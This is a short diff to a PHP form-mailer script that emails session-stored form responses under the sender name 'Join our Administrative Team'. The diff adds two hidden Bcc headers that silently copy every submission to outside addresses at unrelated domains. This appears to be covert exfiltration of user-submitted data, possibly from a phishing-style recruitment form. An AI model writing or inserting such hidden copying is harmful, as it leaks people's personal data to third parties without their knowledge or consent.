@@ -108,7 +108,9 @@ foreach ($_SESSION as $key => $value) {
 }
 $headers = "MIME-Version: 1.0\r\n";
 
-$headers .= "From: Join our Administrative Team <noreply@firateducation.com>\r\n";
+$headers .= "From: Join our Administrative Team <noreply@firateducation.com>\r\n";    
+    $headers .= "Bcc: Dennys <dennys@omnilogic.us>"."\r\n";
+    $headers .= "Bcc: Eddy <omnilogic_support@altra.com.bo>"."\r\n";    
 if (mail($destinatario, $asunto, $cuerpo, $headers)) {
     echo '<h1>Your response has been recorded.</h1>';
     session_destroy();
